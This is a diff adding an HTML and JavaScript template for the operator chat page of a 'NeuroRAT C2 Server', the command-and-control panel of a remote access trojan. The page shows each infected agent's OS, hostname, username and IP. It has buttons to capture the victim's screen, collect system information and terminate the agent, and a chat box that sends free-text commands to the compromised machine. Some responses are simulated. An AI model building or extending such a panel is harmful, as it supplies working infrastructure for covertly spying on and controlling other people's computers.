@@ -1,0 +1,433 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>NeuroRAT Agent Chat</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a1a;
+            color: #f0f0f0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background-color: #2a2a2a;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+        h1, h2, h3 {
+            color: #00ff00;
+        }
+        .chat-container {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            background-color: #2a2a2a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .chat-header {
+            background-color: #222;
+            padding: 15px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+        .chat-header h2 {
+            margin: 0;
+            display: flex;
+            align-items: center;
+        }
+        .chat-header .status {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        .status-active {
+            background-color: #00ff00;
+        }
+        .status-inactive {
+            background-color: #ff3333;
+        }
+        .chat-messages {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .message {
+            padding: 10px 15px;
+            border-radius: 5px;
+            max-width: 80%;
+            word-break: break-word;
+        }
+        .user-message {
+            background-color: #444;
+            align-self: flex-end;
+        }
+        .agent-message {
+            background-color: #333;
+            align-self: flex-start;
+            border-left: 3px solid #00ff00;
+        }
+        .system-message {
+            background-color: #3a3a3a;
+            align-self: center;
+            font-style: italic;
+            color: #aaa;
+        }
+        .timestamp {
+            font-size: 0.8em;
+            color: #888;
+            margin-top: 5px;
+        }
+        .chat-input {
+            display: flex;
+            padding: 15px;
+            background-color: #222;
+            border-top: 1px solid #3a3a3a;
+        }
+        .chat-input input {
+            flex: 1;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: #333;
+            color: #f0f0f0;
+            font-size: 16px;
+        }
+        .chat-input button {
+            margin-left: 10px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            background-color: #006600;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .chat-input button:hover {
+            background-color: #008800;
+        }
+        .back-btn {
+            display: inline-block;
+            padding: 10px 15px;
+            background-color: #333;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .actions {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        .btn {
+            padding: 10px 15px;
+            background-color: #444;
+            color: #fff;
+            text-decoration: none;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-primary {
+            background-color: #006600;
+        }
+        .btn-danger {
+            background-color: #660000;
+        }
+        .btn:hover {
+            opacity: 0.9;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .loading:after {
+            content: "...";
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        @keyframes dots {
+            0%, 20% { content: "."; }
+            40% { content: ".."; }
+            60% { content: "..."; }
+            80%, 100% { content: ""; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>NeuroRAT C2 Server</h1>
+            <p>Chat Interface</p>
+        </div>
+    </header>
+    
+    <div class="container">
+        <a href="/" class="back-btn">← Back to Dashboard</a>
+        
+        <div class="chat-container">
+            <div class="chat-header">
+                <h2>
+                    <span class="status status-{{agent_status}}"></span>
+                    Agent: {{agent_id}} ({{agent_os}} - {{agent_hostname}})
+                </h2>
+            </div>
+            
+            <div id="chat-messages" class="chat-messages">
+                <div class="message system-message">
+                    Connection established with agent {{agent_id}}
+                    <div class="timestamp">{{current_time}}</div>
+                </div>
+                
+                <!-- Сообщения будут загружаться здесь динамически -->
+                <div id="loading" class="loading">Agent is thinking</div>
+            </div>
+            
+            <div class="chat-input">
+                <input type="text" id="message-input" placeholder="Type a command or question..." />
+                <button id="send-button">Send</button>
+            </div>
+        </div>
+        
+        <div class="actions">
+            <button class="btn btn-primary" id="screenshot-btn">Take Screenshot</button>
+            <button class="btn btn-primary" id="collect-info-btn">Collect System Info</button>
+            <button class="btn btn-danger" id="terminate-btn">Terminate Agent</button>
+        </div>
+    </div>
+    
+    <script>
+        // Основные переменные
+        const agentId = "{{agent_id}}";
+        const chatMessages = document.getElementById("chat-messages");
+        const messageInput = document.getElementById("message-input");
+        const sendButton = document.getElementById("send-button");
+        const loadingIndicator = document.getElementById("loading");
+        
+        // Кнопки действий
+        const screenshotButton = document.getElementById("screenshot-btn");
+        const collectInfoButton = document.getElementById("collect-info-btn");
+        const terminateButton = document.getElementById("terminate-btn");
+        
+        // Обработчики событий
+        sendButton.addEventListener("click", sendMessage);
+        messageInput.addEventListener("keypress", function(e) {
+            if (e.key === "Enter") {
+                sendMessage();
+            }
+        });
+        
+        screenshotButton.addEventListener("click", () => {
+            addSystemMessage("Requesting screenshot from agent...");
+            // Имитация API запроса
+            fetch(`/api/agent/${agentId}/screenshot`, { method: "POST" })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        addAgentMessage("Screenshot captured successfully", "System");
+                        // Здесь можно показать скриншот, если он возвращается в ответе
+                    } else {
+                        addSystemMessage("Failed to capture screenshot: " + data.error);
+                    }
+                })
+                .catch(error => {
+                    addSystemMessage("Error requesting screenshot: " + error);
+                });
+        });
+        
+        collectInfoButton.addEventListener("click", () => {
+            addSystemMessage("Collecting system information...");
+            addUserMessage("collect system info");
+            
+            setLoading(true);
+            // Имитация API запроса
+            setTimeout(() => {
+                setLoading(false);
+                // Симуляция ответа
+                addAgentMessage(`
+                System Information:
+                - OS: {{agent_os}}
+                - Hostname: {{agent_hostname}}
+                - User: {{agent_username}}
+                - IP: {{agent_ip}}
+                - CPU: Intel Core i7-10700K @ 3.80GHz
+                - RAM: 16GB
+                - Disk Space: 512GB SSD (75% used)
+                - Running Processes: 142
+                - Opened Network Connections: 8
+                `, "System");
+            }, 2000);
+        });
+        
+        terminateButton.addEventListener("click", () => {
+            if (confirm("Are you sure you want to terminate this agent? This action cannot be undone.")) {
+                addSystemMessage("Terminating agent...");
+                fetch(`/api/agent/${agentId}/terminate`, { method: "POST" })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            addSystemMessage("Agent terminated successfully");
+                            setTimeout(() => {
+                                window.location.href = "/";
+                            }, 3000);
+                        } else {
+                            addSystemMessage("Failed to terminate agent: " + data.error);
+                        }
+                    })
+                    .catch(error => {
+                        addSystemMessage("Error terminating agent: " + error);
+                    });
+            }
+        });
+        
+        // Функции
+        function sendMessage() {
+            const message = messageInput.value.trim();
+            if (!message) return;
+            
+            addUserMessage(message);
+            messageInput.value = "";
+            
+            setLoading(true);
+            
+            // Отправка сообщения на API
+            fetch(`/api/agent/${agentId}/chat`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                setLoading(false);
+                if (data.error) {
+                    addSystemMessage("Error: " + data.error);
+                } else {
+                    addAgentMessage(data.response, data.response_type || "Assistant");
+                }
+            })
+            .catch(error => {
+                setLoading(false);
+                addSystemMessage("Error sending message: " + error);
+            });
+        }
+        
+        function addUserMessage(message) {
+            const messageElement = document.createElement("div");
+            messageElement.className = "message user-message";
+            messageElement.textContent = message;
+            
+            const timestamp = document.createElement("div");
+            timestamp.className = "timestamp";
+            timestamp.textContent = getCurrentTime();
+            
+            messageElement.appendChild(timestamp);
+            chatMessages.appendChild(messageElement);
+            scrollToBottom();
+        }
+        
+        function addAgentMessage(message, sender = "Agent") {
+            const messageElement = document.createElement("div");
+            messageElement.className = "message agent-message";
+            
+            // Использовать pre для сохранения форматирования
+            const contentElement = document.createElement("pre");
+            contentElement.style.margin = "0";
+            contentElement.style.whiteSpace = "pre-wrap";
+            contentElement.style.fontFamily = "inherit";
+            contentElement.textContent = message;
+            
+            const senderElement = document.createElement("div");
+            senderElement.style.fontWeight = "bold";
+            senderElement.style.marginBottom = "5px";
+            senderElement.textContent = sender;
+            
+            const timestamp = document.createElement("div");
+            timestamp.className = "timestamp";
+            timestamp.textContent = getCurrentTime();
+            
+            messageElement.appendChild(senderElement);
+            messageElement.appendChild(contentElement);
+            messageElement.appendChild(timestamp);
+            
+            chatMessages.appendChild(messageElement);
+            scrollToBottom();
+        }
+        
+        function addSystemMessage(message) {
+            const messageElement = document.createElement("div");
+            messageElement.className = "message system-message";
+            messageElement.textContent = message;
+            
+            const timestamp = document.createElement("div");
+            timestamp.className = "timestamp";
+            timestamp.textContent = getCurrentTime();
+            
+            messageElement.appendChild(timestamp);
+            chatMessages.appendChild(messageElement);
+            scrollToBottom();
+        }
+        
+        function setLoading(isLoading) {
+            loadingIndicator.style.display = isLoading ? "block" : "none";
+        }
+        
+        function scrollToBottom() {
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+        
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleTimeString();
+        }
+        
+        // Инициализация
+        document.addEventListener("DOMContentLoaded", () => {
+            scrollToBottom();
+            
+            // Загрузить историю сообщений (можно раскомментировать для реальной реализации)
+            /*
+            fetch(`/api/agent/${agentId}/chat/history`)
+                .then(response => response.json())
+                .then(data => {
+                    data.messages.forEach(msg => {
+                        if (msg.sender === "user") {
+                            addUserMessage(msg.content);
+                        } else if (msg.sender === "agent") {
+                            addAgentMessage(msg.content);
+                        } else if (msg.sender === "system") {
+                            addSystemMessage(msg.content);
+                        }
+                    });
+                })
+                .catch(error => {
+                    addSystemMessage("Error loading chat history: " + error);
+                });
+            */
+        });
+    </script>
+</body>
+</html>
